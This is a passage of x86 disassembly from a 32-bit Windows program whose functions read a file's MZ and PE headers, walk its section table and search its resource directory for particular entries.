  401deb:	85 c0                	test   %eax,%eax
  401ded:	59                   	pop    %ecx
  401dee:	74 27                	je     0x401e17
  401df0:	8b 06                	mov    (%esi),%eax
  401df2:	40                   	inc    %eax
  401df3:	50                   	push   %eax
  401df4:	e8 52 1b 00 00       	call   0x40394b
  401df9:	33 d2                	xor    %edx,%edx
  401dfb:	59                   	pop    %ecx
  401dfc:	39 16                	cmp    %edx,(%esi)
  401dfe:	7e 11                	jle    0x401e11
  401e00:	53                   	push   %ebx
  401e01:	8b c8                	mov    %eax,%ecx
  401e03:	2b f8                	sub    %eax,%edi
  401e05:	8a 1c 0f             	mov    (%edi,%ecx,1),%bl
  401e08:	42                   	inc    %edx
  401e09:	88 19                	mov    %bl,(%ecx)
  401e0b:	41                   	inc    %ecx
  401e0c:	3b 16                	cmp    (%esi),%edx
  401e0e:	7c f5                	jl     0x401e05
  401e10:	5b                   	pop    %ebx
  401e11:	80 24 02 00          	andb   $0x0,(%edx,%eax,1)
  401e15:	eb 02                	jmp    0x401e19
  401e17:	8b c7                	mov    %edi,%eax
  401e19:	5f                   	pop    %edi
  401e1a:	5e                   	pop    %esi
  401e1b:	c3                   	ret
  401e1c:	8b c1                	mov    %ecx,%eax
  401e1e:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401e22:	89 08                	mov    %ecx,(%eax)
  401e24:	c2 04 00             	ret    $0x4
  401e27:	b8 da 80 40 00       	mov    $0x4080da,%eax
  401e2c:	e8 07 1f 00 00       	call   0x403d38
  401e31:	81 ec 3c 01 00 00    	sub    $0x13c,%esp
  401e37:	56                   	push   %esi
  401e38:	6a 40                	push   $0x40
  401e3a:	e8 0c 1b 00 00       	call   0x40394b
  401e3f:	59                   	pop    %ecx
  401e40:	8b c8                	mov    %eax,%ecx
  401e42:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  401e45:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  401e49:	85 c9                	test   %ecx,%ecx
  401e4b:	74 19                	je     0x401e66
  401e4d:	6a 01                	push   $0x1
  401e4f:	ff 35 40 91 40 00    	push   0x409140
  401e55:	68 80 00 00 00       	push   $0x80
  401e5a:	ff 75 08             	push   0x8(%ebp)
  401e5d:	e8 ed 09 00 00       	call   0x40284f
  401e62:	8b f0                	mov    %eax,%esi
  401e64:	eb 02                	jmp    0x401e68
  401e66:	33 f6                	xor    %esi,%esi
  401e68:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  401e6c:	8d 45 b0             	lea    -0x50(%ebp),%eax
  401e6f:	6a 40                	push   $0x40
  401e71:	50                   	push   %eax
  401e72:	8b ce                	mov    %esi,%ecx
  401e74:	e8 41 0b 00 00       	call   0x4029ba
  401e79:	6a 00                	push   $0x0
  401e7b:	8b ce                	mov    %esi,%ecx
  401e7d:	ff 75 ec             	push   -0x14(%ebp)
  401e80:	e8 76 0b 00 00       	call   0x4029fb
  401e85:	8d 85 b8 fe ff ff    	lea    -0x148(%ebp),%eax
  401e8b:	68 f8 00 00 00       	push   $0xf8
  401e90:	50                   	push   %eax
  401e91:	8b ce                	mov    %esi,%ecx
  401e93:	e8 22 0b 00 00       	call   0x4029ba
  401e98:	8b ce                	mov    %esi,%ecx
  401e9a:	e8 56 09 00 00       	call   0x4027f5
  401e9f:	85 f6                	test   %esi,%esi
  401ea1:	74 0f                	je     0x401eb2
  401ea3:	8b 06                	mov    (%esi),%eax
  401ea5:	6a 01                	push   $0x1
  401ea7:	8b 40 04             	mov    0x4(%eax),%eax
  401eaa:	8d 0c 30             	lea    (%eax,%esi,1),%ecx
  401ead:	8b 04 30             	mov    (%eax,%esi,1),%eax
  401eb0:	ff 10                	call   *(%eax)
  401eb2:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  401eb6:	5e                   	pop    %esi
  401eb7:	7e 0d                	jle    0x401ec6
  401eb9:	66 83 bd 14 ff ff ff 	cmpw   $0x2,-0xec(%ebp)
  401ec0:	02 
  401ec1:	0f 94 c0             	sete   %al
  401ec4:	eb 02                	jmp    0x401ec8
  401ec6:	32 c0                	xor    %al,%al
  401ec8:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401ecb:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401ed2:	c9                   	leave
  401ed3:	c2 04 00             	ret    $0x4
  401ed6:	b8 f8 80 40 00       	mov    $0x4080f8,%eax
  401edb:	e8 58 1e 00 00       	call   0x403d38
  401ee0:	81 ec 78 01 00 00    	sub    $0x178,%esp
  401ee6:	53                   	push   %ebx
  401ee7:	56                   	push   %esi
  401ee8:	57                   	push   %edi
  401ee9:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  401eec:	6a 40                	push   $0x40
  401eee:	e8 58 1a 00 00       	call   0x40394b
  401ef3:	59                   	pop    %ecx
  401ef4:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401ef7:	33 ff                	xor    %edi,%edi
  401ef9:	3b c7                	cmp    %edi,%eax
  401efb:	89 7d fc             	mov    %edi,-0x4(%ebp)
  401efe:	74 1d                	je     0x401f1d
  401f00:	6a 01                	push   $0x1
  401f02:	8b c8                	mov    %eax,%ecx
  401f04:	5b                   	pop    %ebx
  401f05:	53                   	push   %ebx
  401f06:	ff 35 40 91 40 00    	push   0x409140
  401f0c:	68 80 00 00 00       	push   $0x80
  401f11:	ff 75 08             	push   0x8(%ebp)
  401f14:	e8 36 09 00 00       	call   0x40284f
  401f19:	8b f0                	mov    %eax,%esi
  401f1b:	eb 05                	jmp    0x401f22
  401f1d:	6a 01                	push   $0x1
  401f1f:	33 f6                	xor    %esi,%esi
  401f21:	5b                   	pop    %ebx
  401f22:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  401f26:	6a 48                	push   $0x48
  401f28:	e8 1e 1a 00 00       	call   0x40394b
  401f2d:	59                   	pop    %ecx
  401f2e:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401f31:	3b c7                	cmp    %edi,%eax
  401f33:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401f36:	74 18                	je     0x401f50
  401f38:	53                   	push   %ebx
  401f39:	8b c8                	mov    %eax,%ecx
  401f3b:	ff 35 40 91 40 00    	push   0x409140
  401f41:	68 83 00 00 00       	push   $0x83
  401f46:	ff 75 08             	push   0x8(%ebp)
  401f49:	e8 84 0e 00 00       	call   0x402dd2
  401f4e:	8b f8                	mov    %eax,%edi
  401f50:	8b 06                	mov    (%esi),%eax
  401f52:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  401f56:	8b 40 04             	mov    0x4(%eax),%eax
  401f59:	f6 44 30 08 06       	testb  $0x6,0x8(%eax,%esi,1)
  401f5e:	0f 85 6e 03 00 00    	jne    0x4022d2
  401f64:	8b 07                	mov    (%edi),%eax
  401f66:	8b 40 04             	mov    0x4(%eax),%eax
  401f69:	f6 44 38 08 06       	testb  $0x6,0x8(%eax,%edi,1)
  401f6e:	0f 85 5e 03 00 00    	jne    0x4022d2
  401f74:	8d 85 74 ff ff ff    	lea    -0x8c(%ebp),%eax
  401f7a:	6a 40                	push   $0x40
  401f7c:	50                   	push   %eax
  401f7d:	8b ce                	mov    %esi,%ecx
  401f7f:	e8 36 0a 00 00       	call   0x4029ba
  401f84:	80 bd 74 ff ff ff 4d 	cmpb   $0x4d,-0x8c(%ebp)
  401f8b:	0f 85 0f 03 00 00    	jne    0x4022a0
  401f91:	33 c0                	xor    %eax,%eax
  401f93:	8a 85 75 ff ff ff    	mov    -0x8b(%ebp),%al
  401f99:	3c 5a                	cmp    $0x5a,%al
  401f9b:	0f 85 ff 02 00 00    	jne    0x4022a0
  401fa1:	83 7d b0 00          	cmpl   $0x0,-0x50(%ebp)
  401fa5:	75 13                	jne    0x401fba
  401fa7:	8b cf                	mov    %edi,%ecx
  401fa9:	e8 00 0f 00 00       	call   0x402eae
  401fae:	8b ce                	mov    %esi,%ecx
  401fb0:	e8 40 08 00 00       	call   0x4027f5
  401fb5:	e9 f4 02 00 00       	jmp    0x4022ae
  401fba:	6a 00                	push   $0x0
  401fbc:	8b ce                	mov    %esi,%ecx
  401fbe:	ff 75 b0             	push   -0x50(%ebp)
  401fc1:	e8 35 0a 00 00       	call   0x4029fb
  401fc6:	8d 85 7c fe ff ff    	lea    -0x184(%ebp),%eax
  401fcc:	68 f8 00 00 00       	push   $0xf8
  401fd1:	50                   	push   %eax
  401fd2:	8b ce                	mov    %esi,%ecx
  401fd4:	e8 e1 09 00 00       	call   0x4029ba
  401fd9:	83 bd 04 ff ff ff 00 	cmpl   $0x0,-0xfc(%ebp)
  401fe0:	0f 84 ba 02 00 00    	je     0x4022a0
  401fe6:	0f b7 85 82 fe ff ff 	movzwl -0x17e(%ebp),%eax
  401fed:	8d 04 80             	lea    (%eax,%eax,4),%eax
  401ff0:	c1 e0 03             	shl    $0x3,%eax
  401ff3:	50                   	push   %eax
  401ff4:	e8 52 19 00 00       	call   0x40394b
  401ff9:	8b d8                	mov    %eax,%ebx
  401ffb:	59                   	pop    %ecx
  401ffc:	0f b7 85 82 fe ff ff 	movzwl -0x17e(%ebp),%eax
  402003:	8b ce                	mov    %esi,%ecx
  402005:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  402008:	8d 04 80             	lea    (%eax,%eax,4),%eax
  40200b:	c1 e0 03             	shl    $0x3,%eax
  40200e:	50                   	push   %eax
  40200f:	53                   	push   %ebx
  402010:	e8 a5 09 00 00       	call   0x4029ba
  402015:	0f b7 8d 82 fe ff ff 	movzwl -0x17e(%ebp),%ecx
  40201c:	33 c0                	xor    %eax,%eax
  40201e:	85 c9                	test   %ecx,%ecx
  402020:	7e 1c                	jle    0x40203e
  402022:	8d 53 0c             	lea    0xc(%ebx),%edx
  402025:	89 55 08             	mov    %edx,0x8(%ebp)
  402028:	8b 55 08             	mov    0x8(%ebp),%edx
  40202b:	8b 12                	mov    (%edx),%edx
  40202d:	3b 95 04 ff ff ff    	cmp    -0xfc(%ebp),%edx
  402033:	74 09                	je     0x40203e
  402035:	83 45 08 28          	addl   $0x28,0x8(%ebp)
  402039:	40                   	inc    %eax
  40203a:	3b c1                	cmp    %ecx,%eax
  40203c:	7c ea                	jl     0x402028
  40203e:	3b c1                	cmp    %ecx,%eax
  402040:	75 40                	jne    0x402082
  402042:	53                   	push   %ebx
  402043:	e8 11 19 00 00       	call   0x403959
  402048:	59                   	pop    %ecx
  402049:	8b ce                	mov    %esi,%ecx
  40204b:	e8 a5 07 00 00       	call   0x4027f5
  402050:	8b cf                	mov    %edi,%ecx
  402052:	e8 57 0e 00 00       	call   0x402eae
  402057:	85 ff                	test   %edi,%edi
  402059:	74 0f                	je     0x40206a
  40205b:	8b 07                	mov    (%edi),%eax
  40205d:	6a 01                	push   $0x1
  40205f:	8b 40 04             	mov    0x4(%eax),%eax
  402062:	03 f8                	add    %eax,%edi
  402064:	8b cf                	mov    %edi,%ecx
  402066:	8b 07                	mov    (%edi),%eax
  402068:	ff 10                	call   *(%eax)
  40206a:	85 f6                	test   %esi,%esi
  40206c:	0f 84 92 02 00 00    	je     0x402304
  402072:	8b 06                	mov    (%esi),%eax
  402074:	6a 01                	push   $0x1
  402076:	8b 40 04             	mov    0x4(%eax),%eax
  402079:	03 f0                	add    %eax,%esi
  40207b:	8b 06                	mov    (%esi),%eax
  40207d:	e9 4c 02 00 00       	jmp    0x4022ce
  402082:	8d 04 80             	lea    (%eax,%eax,4),%eax
  402085:	6a 00                	push   $0x0
  402087:	8b 4c c3 14          	mov    0x14(%ebx,%eax,8),%ecx
  40208b:	8d 04 c3             	lea    (%ebx,%eax,8),%eax
  40208e:	89 4d 08             	mov    %ecx,0x8(%ebp)
  402091:	51                   	push   %ecx
  402092:	8b 40 0c             	mov    0xc(%eax),%eax
  402095:	2b c1                	sub    %ecx,%eax
  402097:	8b ce                	mov    %esi,%ecx
  402099:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40209c:	e8 5a 09 00 00       	call   0x4029fb
  4020a1:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4020a4:	6a 10                	push   $0x10
  4020a6:	50                   	push   %eax
  4020a7:	8b ce                	mov    %esi,%ecx
  4020a9:	e8 0c 09 00 00       	call   0x4029ba
  4020ae:	0f b7 45 e8          	movzwl -0x18(%ebp),%eax
  4020b2:	0f b7 4d ea          	movzwl -0x16(%ebp),%ecx
  4020b6:	03 c1                	add    %ecx,%eax
  4020b8:	c1 e0 03             	shl    $0x3,%eax
  4020bb:	50                   	push   %eax
  4020bc:	e8 8a 18 00 00       	call   0x40394b
  4020c1:	59                   	pop    %ecx
  4020c2:	8b d8                	mov    %eax,%ebx
  4020c4:	0f b7 45 e8          	movzwl -0x18(%ebp),%eax
  4020c8:	0f b7 4d ea          	movzwl -0x16(%ebp),%ecx
  4020cc:	03 c1                	add    %ecx,%eax
  4020ce:	8b ce                	mov    %esi,%ecx
  4020d0:	c1 e0 03             	shl    $0x3,%eax
  4020d3:	50                   	push   %eax
  4020d4:	53                   	push   %ebx
  4020d5:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  4020d8:	e8 dd 08 00 00       	call   0x4029ba
  4020dd:	0f b7 4d e8          	movzwl -0x18(%ebp),%ecx
  4020e1:	0f b7 55 ea          	movzwl -0x16(%ebp),%edx
  4020e5:	03 ca                	add    %edx,%ecx
  4020e7:	33 c0                	xor    %eax,%eax
  4020e9:	85 c9                	test   %ecx,%ecx
  4020eb:	7e 10                	jle    0x4020fd
  4020ed:	8b d3                	mov    %ebx,%edx
  4020ef:	66 83 3a 03          	cmpw   $0x3,(%edx)
  4020f3:	74 08                	je     0x4020fd
  4020f5:	40                   	inc    %eax
  4020f6:	83 c2 08             	add    $0x8,%edx
  4020f9:	3b c1                	cmp    %ecx,%eax
  4020fb:	7c f2                	jl     0x4020ef
  4020fd:	3b c1                	cmp    %ecx,%eax
  4020ff:	75 14                	jne    0x402115
  402101:	53                   	push   %ebx
  402102:	e8 52 18 00 00       	call   0x403959
  402107:	ff 75 d8             	push   -0x28(%ebp)
  40210a:	e8 4a 18 00 00       	call   0x403959
  40210f:	59                   	pop    %ecx
  402110:	e9 33 ff ff ff       	jmp    0x402048
  402115:	8b 44 c3 04          	mov    0x4(%ebx,%eax,8),%eax
  402119:	bb ff ff ff 7f       	mov    $0x7fffffff,%ebx
  40211e:	23 c3                	and    %ebx,%eax
  402120:	6a 00                	push   $0x0
  402122:	03 45 08             	add    0x8(%ebp),%eax
  402125:	8b ce                	mov    %esi,%ecx
  402127:	50                   	push   %eax
  402128:	e8 ce 08 00 00       	call   0x4029fb
  40212d:	8d 45 dc             	lea    -0x24(%ebp),%eax
  402130:	6a 10                	push   $0x10
  402132:	50                   	push   %eax
  402133:	8b ce                	mov    %esi,%ecx
  402135:	e8 80 08 00 00       	call   0x4029ba
  40213a:	ff 75 f0             	push   -0x10(%ebp)
  40213d:	e8 17 18 00 00       	call   0x403959
  402142:	0f b7 45 e8          	movzwl -0x18(%ebp),%eax
  402146:	0f b7 4d ea          	movzwl -0x16(%ebp),%ecx
  40214a:	03 c1                	add    %ecx,%eax
  40214c:	c1 e0 03             	shl    $0x3,%eax
  40214f:	50                   	push   %eax
  402150:	e8 f6 17 00 00       	call   0x40394b
  402155:	0f b7 55 ea          	movzwl -0x16(%ebp),%edx
  402159:	59                   	pop    %ecx
  40215a:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40215d:	59                   	pop    %ecx
  40215e:	0f b7 4d e8          	movzwl -0x18(%ebp),%ecx
  402162:	03 ca                	add    %edx,%ecx
  402164:	c1 e1 03             	shl    $0x3,%ecx
  402167:	51                   	push   %ecx
  402168:	50                   	push   %eax
  402169:	8b ce                	mov    %esi,%ecx
  40216b:	e8 4a 08 00 00       	call   0x4029ba
  402170:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402173:	6a 00                	push   $0x0
  402175:	8b ce                	mov    %esi,%ecx
  402177:	8b 40 04             	mov    0x4(%eax),%eax
  40217a:	23 c3                	and    %ebx,%eax
  40217c:	03 45 08             	add    0x8(%ebp),%eax
  40217f:	50                   	push   %eax
  402180:	e8 76 08 00 00       	call   0x4029fb
  402185:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  402188:	6a 10                	push   $0x10
  40218a:	50                   	push   %eax
  40218b:	8b ce                	mov    %esi,%ecx
  40218d:	e8 28 08 00 00       	call   0x4029ba
  402192:	0f b7 45 d0          	movzwl -0x30(%ebp),%eax
  402196:	0f b7 4d d2          	movzwl -0x2e(%ebp),%ecx
  40219a:	03 c1                	add    %ecx,%eax
  40219c:	c1 e0 03             	shl    $0x3,%eax
  40219f:	50                   	push   %eax
  4021a0:	e8 a6 17 00 00       	call   0x40394b
  4021a5:	59                   	pop    %ecx
  4021a6:	8b d8                	mov    %eax,%ebx
  4021a8:	0f b7 45 d0          	movzwl -0x30(%ebp),%eax
  4021ac:	0f b7 4d d2          	movzwl -0x2e(%ebp),%ecx
  4021b0:	03 c1                	add    %ecx,%eax
  4021b2:	8b ce                	mov    %esi,%ecx
  4021b4:	c1 e0 03             	shl    $0x3,%eax
  4021b7:	50                   	push   %eax
  4021b8:	53                   	push   %ebx
  4021b9:	e8 fc 07 00 00       	call   0x4029ba
  4021be:	8b 43 04             	mov    0x4(%ebx),%eax
  4021c1:	6a 00                	push   $0x0
  4021c3:	03 45 08             	add    0x8(%ebp),%eax
  4021c6:	8b ce                	mov    %esi,%ecx
  4021c8:	50                   	push   %eax
  4021c9:	e8 2d 08 00 00       	call   0x4029fb
  4021ce:	8b 43 04             	mov    0x4(%ebx),%eax
  4021d1:	6a 00                	push   $0x0
  4021d3:	03 45 08             	add    0x8(%ebp),%eax
  4021d6:	8d 4f 0c             	lea    0xc(%edi),%ecx
  4021d9:	50                   	push   %eax
  4021da:	e8 94 0b 00 00       	call   0x402d73
  4021df:	53                   	push   %ebx
  4021e0:	e8 74 17 00 00       	call   0x403959
  4021e5:	59                   	pop    %ecx
  4021e6:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  4021e9:	6a 10                	push   $0x10
  4021eb:	50                   	push   %eax
  4021ec:	8b ce                	mov    %esi,%ecx
  4021ee:	e8 c7 07 00 00       	call   0x4029ba
  4021f3:	8b 45 14             	mov    0x14(%ebp),%eax
  4021f6:	85 c0                	test   %eax,%eax
  4021f8:	75 03                	jne    0x4021fd
  4021fa:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  4021fd:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  402200:	8d 5f 0c             	lea    0xc(%edi),%ebx
  402203:	89 08                	mov    %ecx,(%eax)
  402205:	6a 10                	push   $0x10
  402207:	50                   	push   %eax
  402208:	8b cb                	mov    %ebx,%ecx
  40220a:	e8 68 07 00 00       	call   0x402977
  40220f:	ff 75 f0             	push   -0x10(%ebp)
  402212:	e8 42 17 00 00       	call   0x403959
  402217:	ff 75 d8             	push   -0x28(%ebp)
  40221a:	e8 3a 17 00 00       	call   0x403959
  40221f:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  402222:	59                   	pop    %ecx
  402223:	2b 45 ec             	sub    -0x14(%ebp),%eax
  402226:	59                   	pop    %ecx
  402227:	6a 00                	push   $0x0
  402229:	8b cb                	mov    %ebx,%ecx
  40222b:	50                   	push   %eax
  40222c:	e8 42 0b 00 00       	call   0x402d73
  402231:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  402235:	8b 5d d4             	mov    -0x2c(%ebp),%ebx
  402238:	75 0b                	jne    0x402245
  40223a:	ff 33                	push   (%ebx)
  40223c:	e8 0a 17 00 00       	call   0x40394b
  402241:	59                   	pop    %ecx
  402242:	89 45 10             	mov    %eax,0x10(%ebp)
  402245:	8b 45 0c             	mov    0xc(%ebp),%eax
  402248:	3b 03                	cmp    (%ebx),%eax
  40224a:	7d 0a                	jge    0x402256
  40224c:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40224f:	80 24 08 00          	andb   $0x0,(%eax,%ecx,1)
  402253:	40                   	inc    %eax
  402254:	eb f2                	jmp    0x402248
  402256:	ff 33                	push   (%ebx)
  402258:	8d 4f 0c             	lea    0xc(%edi),%ecx
  40225b:	ff 75 10             	push   0x10(%ebp)
  40225e:	e8 14 07 00 00       	call   0x402977
  402263:	ff 75 10             	push   0x10(%ebp)
  402266:	e8 ee 16 00 00       	call   0x403959
  40226b:	59                   	pop    %ecx
  40226c:	8b cf                	mov    %edi,%ecx
  40226e:	e8 3b 0c 00 00       	call   0x402eae
  402273:	8b ce                	mov    %esi,%ecx
  402275:	e8 7b 05 00 00       	call   0x4027f5
  40227a:	85 ff                	test   %edi,%edi
  40227c:	74 0f                	je     0x40228d
  40227e:	8b 07                	mov    (%edi),%eax
  402280:	6a 01                	push   $0x1
  402282:	8b 40 04             	mov    0x4(%eax),%eax
  402285:	03 f8                	add    %eax,%edi
  402287:	8b cf                	mov    %edi,%ecx
  402289:	8b 07                	mov    (%edi),%eax
  40228b:	ff 10                	call   *(%eax)
  40228d:	85 f6                	test   %esi,%esi
  40228f:	74 73                	je     0x402304
  402291:	8b 06                	mov    (%esi),%eax
  402293:	6a 01                	push   $0x1
  402295:	8b 40 04             	mov    0x4(%eax),%eax
  402298:	8d 0c 30             	lea    (%eax,%esi,1),%ecx
  40229b:	8b 04 30             	mov    (%eax,%esi,1),%eax
  40229e:	eb 62                	jmp    0x402302
  4022a0:	8b ce                	mov    %esi,%ecx
  4022a2:	e8 4e 05 00 00       	call   0x4027f5
  4022a7:	8b cf                	mov    %edi,%ecx
  4022a9:	e8 00 0c 00 00       	call   0x402eae
  4022ae:	85 ff                	test   %edi,%edi
  4022b0:	74 0e                	je     0x4022c0
  4022b2:	8b 07                	mov    (%edi),%eax
  4022b4:	53                   	push   %ebx
  4022b5:	8b 40 04             	mov    0x4(%eax),%eax
  4022b8:	03 f8                	add    %eax,%edi
  4022ba:	8b cf                	mov    %edi,%ecx
  4022bc:	8b 07                	mov    (%edi),%eax
  4022be:	ff 10                	call   *(%eax)
  4022c0:	85 f6                	test   %esi,%esi
  4022c2:	74 40                	je     0x402304
  4022c4:	8b 06                	mov    (%esi),%eax
  4022c6:	53                   	push   %ebx
  4022c7:	8b 40 04             	mov    0x4(%eax),%eax
  4022ca:	03 f0                	add    %eax,%esi
  4022cc:	8b 06                	mov    (%esi),%eax
  4022ce:	8b ce                	mov    %esi,%ecx
  4022d0:	eb 30                	jmp    0x402302
  4022d2:	8b ce                	mov    %esi,%ecx
  4022d4:	e8 1c 05 00 00       	call   0x4027f5
  4022d9:	8b cf                	mov    %edi,%ecx
  4022db:	e8 ce 0b 00 00       	call   0x402eae
  4022e0:	85 f6                	test   %esi,%esi
  4022e2:	74 0e                	je     0x4022f2
  4022e4:	8b 06                	mov    (%esi),%eax
  4022e6:	53                   	push   %ebx
  4022e7:	8b 40 04             	mov    0x4(%eax),%eax
  4022ea:	03 f0                	add    %eax,%esi
  4022ec:	8b ce                	mov    %esi,%ecx
  4022ee:	8b 06                	mov    (%esi),%eax
  4022f0:	ff 10                	call   *(%eax)
  4022f2:	85 ff                	test   %edi,%edi
  4022f4:	74 0e                	je     0x402304
  4022f6:	8b 07                	mov    (%edi),%eax
  4022f8:	53                   	push   %ebx
  4022f9:	8b 40 04             	mov    0x4(%eax),%eax
  4022fc:	03 f8                	add    %eax,%edi
  4022fe:	8b cf                	mov    %edi,%ecx
  402300:	8b 07                	mov    (%edi),%eax
  402302:	ff 10                	call   *(%eax)
  402304:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402307:	5f                   	pop    %edi
  402308:	5e                   	pop    %esi
  402309:	5b                   	pop    %ebx
  40230a:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402311:	c9                   	leave
  402312:	c2 10 00             	ret    $0x10
  402315:	b8 0e 81 40 00       	mov    $0x40810e,%eax
  40231a:	e8 19 1a 00 00       	call   0x403d38
  40231f:	81 ec 9c 01 00 00    	sub    $0x19c,%esp
  402325:	53                   	push   %ebx
  402326:	56                   	push   %esi
  402327:	57                   	push   %edi
  402328:	8b f1                	mov    %ecx,%esi
  40232a:	6a 40                	push   $0x40
  40232c:	89 75 f0             	mov    %esi,-0x10(%ebp)
  40232f:	e8 17 16 00 00       	call   0x40394b
  402334:	59                   	pop    %ecx
  402335:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  402338:	33 ff                	xor    %edi,%edi
  40233a:	3b c7                	cmp    %edi,%eax
  40233c:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40233f:	74 1b                	je     0x40235c
  402341:	6a 01                	push   $0x1
  402343:	8b c8                	mov    %eax,%ecx
  402345:	ff 35 40 91 40 00    	push   0x409140
  40234b:	68 80 00 00 00       	push   $0x80
  402350:	ff 75 08             	push   0x8(%ebp)
  402353:	e8 f7 04 00 00       	call   0x40284f
  402358:	8b d8                	mov    %eax,%ebx
  40235a:	eb 02                	jmp    0x40235e
  40235c:	33 db                	xor    %ebx,%ebx
  40235e:	8b 03                	mov    (%ebx),%eax
  402360:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  402364:	8b 40 04             	mov    0x4(%eax),%eax
  402367:	f6 44 18 08 06       	testb  $0x6,0x8(%eax,%ebx,1)
  40236c:	8d 0c 18             	lea    (%eax,%ebx,1),%ecx
  40236f:	74 11                	je     0x402382
  402371:	3b df                	cmp    %edi,%ebx
  402373:	0f 84 69 03 00 00    	je     0x4026e2
  402379:	8b 01                	mov    (%ecx),%eax
  40237b:	6a 01                	push   $0x1
  40237d:	e9 5e 03 00 00       	jmp    0x4026e0
  402382:	8d 85 50 ff ff ff    	lea    -0xb0(%ebp),%eax
  402388:	6a 40                	push   $0x40
  40238a:	50                   	push   %eax
  40238b:	8b cb                	mov    %ebx,%ecx
  40238d:	e8 28 06 00 00       	call   0x4029ba
  402392:	80 bd 50 ff ff ff 4d 	cmpb   $0x4d,-0xb0(%ebp)
  402399:	0f 85 29 03 00 00    	jne    0x4026c8
  40239f:	33 c0                	xor    %eax,%eax
  4023a1:	8a 85 51 ff ff ff    	mov    -0xaf(%ebp),%al
  4023a7:	3c 5a                	cmp    $0x5a,%al
  4023a9:	0f 85 19 03 00 00    	jne    0x4026c8
  4023af:	39 7d 8c             	cmp    %edi,-0x74(%ebp)
  4023b2:	0f 84 10 03 00 00    	je     0x4026c8
  4023b8:	57                   	push   %edi
  4023b9:	8b cb                	mov    %ebx,%ecx
  4023bb:	ff 75 8c             	push   -0x74(%ebp)
  4023be:	e8 38 06 00 00       	call   0x4029fb
  4023c3:	8d 85 58 fe ff ff    	lea    -0x1a8(%ebp),%eax
  4023c9:	68 f8 00 00 00       	push   $0xf8
  4023ce:	50                   	push   %eax
  4023cf:	8b cb                	mov    %ebx,%ecx
  4023d1:	e8 e4 05 00 00       	call   0x4029ba
  4023d6:	39 bd e0 fe ff ff    	cmp    %edi,-0x120(%ebp)
  4023dc:	0f 84 e6 02 00 00    	je     0x4026c8
  4023e2:	0f b7 85 5e fe ff ff 	movzwl -0x1a2(%ebp),%eax
  4023e9:	8d 04 80             	lea    (%eax,%eax,4),%eax
  4023ec:	c1 e0 03             	shl    $0x3,%eax
  4023ef:	50                   	push   %eax
  4023f0:	e8 56 15 00 00       	call   0x40394b
  4023f5:	8b f0                	mov    %eax,%esi
  4023f7:	59                   	pop    %ecx
  4023f8:	0f b7 85 5e fe ff ff 	movzwl -0x1a2(%ebp),%eax
  4023ff:	8b cb                	mov    %ebx,%ecx
  402401:	89 75 e8             	mov    %esi,-0x18(%ebp)
  402404:	8d 04 80             	lea    (%eax,%eax,4),%eax
  402407:	c1 e0 03             	shl    $0x3,%eax
  40240a:	50                   	push   %eax
  40240b:	56                   	push   %esi
  40240c:	e8 a9 05 00 00       	call   0x4029ba
  402411:	0f b7 8d 5e fe ff ff 	movzwl -0x1a2(%ebp),%ecx
  402418:	33 c0                	xor    %eax,%eax
  40241a:	3b cf                	cmp    %edi,%ecx
  40241c:	7e 17                	jle    0x402435
  40241e:	8d 56 0c             	lea    0xc(%esi),%edx
  402421:	8b 3a                	mov    (%edx),%edi
  402423:	3b bd e0 fe ff ff    	cmp    -0x120(%ebp),%edi
  402429:	74 08                	je     0x402433
  40242b:	40                   	inc    %eax
  40242c:	83 c2 28             	add    $0x28,%edx
  40242f:	3b c1                	cmp    %ecx,%eax
  402431:	7c ee                	jl     0x402421
  402433:	33 ff                	xor    %edi,%edi
  402435:	3b c1                	cmp    %ecx,%eax
  402437:	75 29                	jne    0x402462
  402439:	56                   	push   %esi
  40243a:	e8 1a 15 00 00       	call   0x403959
  40243f:	59                   	pop    %ecx
  402440:	8b cb                	mov    %ebx,%ecx
  402442:	e8 ae 03 00 00       	call   0x4027f5
  402447:	3b df                	cmp    %edi,%ebx
  402449:	74 0f                	je     0x40245a
  40244b:	8b 03                	mov    (%ebx),%eax
  40244d:	6a 01                	push   $0x1
  40244f:	8b 40 04             	mov    0x4(%eax),%eax
  402452:	03 d8                	add    %eax,%ebx
  402454:	8b cb                	mov    %ebx,%ecx
  402456:	8b 03                	mov    (%ebx),%eax
  402458:	ff 10                	call   *(%eax)
  40245a:	57                   	push   %edi
  40245b:	57                   	push   %edi
  40245c:	57                   	push   %edi
  40245d:	e9 f4 01 00 00       	jmp    0x402656
  402462:	8d 04 80             	lea    (%eax,%eax,4),%eax
  402465:	6a 00                	push   $0x0
  402467:	8b cb                	mov    %ebx,%ecx
  402469:	8b 7c c6 14          	mov    0x14(%esi,%eax,8),%edi
  40246d:	8d 04 c6             	lea    (%esi,%eax,8),%eax
  402470:	57                   	push   %edi
  402471:	89 7d c0             	mov    %edi,-0x40(%ebp)
  402474:	8b 70 0c             	mov    0xc(%eax),%esi
